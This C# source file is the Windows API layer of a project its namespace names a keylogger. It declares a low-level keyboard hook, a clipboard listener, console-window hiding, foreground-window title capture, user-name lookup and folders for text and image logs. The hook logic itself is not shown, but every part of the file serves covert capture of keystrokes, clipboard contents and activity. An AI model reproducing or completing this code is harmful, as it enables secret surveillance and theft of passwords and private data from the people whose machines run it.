using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyLoggerVersion1._0
{
    public class API
    {
        #region API

        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
        //<summary>
        // Install hook into hook chain - hook proc uses to monitor the system for certain types of events.
        //</summary>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex
        //<summary>
        // Remove hook proc install in a hook chain.
        //</summary>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex
        //<summary>
        // Passed the hook infomation to next hook proc in the current hook chain.
        //</summary>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        //Reference https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
        //<summary>
        // Retrieves a module handle for the specified module.
        //</summary>
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        //Reference https://docs.microsoft.com/en-us/windows/console/getconsolewindow
        //<summary>
        // Retrieves the window handle used by the console associated with the calling process.
        //</summary>
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
        //<summary>
        // Sets the specified window's show state.
        //</summary>
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-addclipboardformatlistener
        //<summary>
        // Places the given window in the system-maintained clipboard format listener list.
        //</summary>
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AddClipboardFormatListener(IntPtr hwnd);

        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-removeclipboardformatlistener
        //<summary>
        // Removes the given window from the system-maintained clipboard format listener list.
        //</summary>
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool RemoveClipBoardFormatListener(IntPtr hwnd);

        //Reference https://www.pinvoke.net/default.aspx/user32.setparent
        //<summary>
        // The SetParent function changes the parent window of the specified child window.
        //</summary>
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

        //Reference https://www.pinvoke.net/default.aspx/user32/getwindowtext.html
        //<summary>
        // Copies the text of the specified window's title bar (if it has one) into a buffer. If the specified window is a control, the text of the control is copied.
        //</summary>
        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        //Reference https://www.pinvoke.net/default.aspx/user32.getwindowtextlength
        //<summary>
        // The GetWindowTextLength API.
        //</summary>
        [DllImport("user32.dll")]
        public static extern int GetWindowTextLength(IntPtr hWnd);

        //Reference https://www.pinvoke.net/default.aspx/user32.getforegroundwindow
        //<summary>
        // Returns a handle to the window the user is working with.
        //</summary>
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate
        //<summary>
        // Retrieves the status of the specified virtual key. Like up, down or toggle (on , off).
        //</summary>
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowthreadprocessid
        //<summary>
        // Retrieves the identifier of the thread that created the specified window
        //</summary>
        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

        //Reference https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85)
        //<summary>
        //The system calls this function every time a new keyboard input event is about to be posted into a thread input queue
        //</summary>
        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        //<summary>
        // Get the current process active in scene and return name of it
        //</summary>
        public static string GetActiveWindow()
        {
            IntPtr active_window = API.GetForegroundWindow();
            int length = API.GetWindowTextLength(active_window);
            StringBuilder sb = new StringBuilder(length + 1);
            API.GetWindowText(active_window, sb, sb.Capacity);
            return sb.ToString();
        }

        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getdesktopwindow
        //<summary>
        //Retrieves a handle to the desktop window
        //</summary>
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr GetDesktopWindow();

        #endregion API
        #region Variables

        public const int HOOK_PROCEDURE_MONITOR_LOW_LEVEL_KEYBOARD_UP = 13;
        public const int COMPARED_wPram_TO_KNOW_NON_KEYPRESS = 0x0100;
        public const int HIDE_VALUE_FROM_APPLICATION = 0;
        public const int VALUE_SENT_WHEN_CLIPBOARD_CHANGE = 0x031D;
        public const int VK_CAPSLOCK_VALUE = 0x14;
        public const int VK_NUMLOCK_VALUE = 0x90;
        public const int VK_SHIFT_VALUE = 0x10;
        public const int WM_ACTIVATEAPP = 0x001C;
        public const int WM_CLIPBOARDUPDATE = VALUE_SENT_WHEN_CLIPBOARD_CHANGE;
        public static IntPtr HWND_MESSAGE = new IntPtr(-3);
        public static bool appActive = true;
        //public static string logName = Path.GetTempPath() + Guid.NewGuid().ToString() + ".log";
        public static string lastTitle = "";
        public static string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        public static string SaveLogFileImage = System.IO.Directory.GetCurrentDirectory() +"/Image";
        public static string SaveLogFileText = System.IO.Directory.GetCurrentDirectory() + "/TextLog";

        #endregion Variables
    }
}
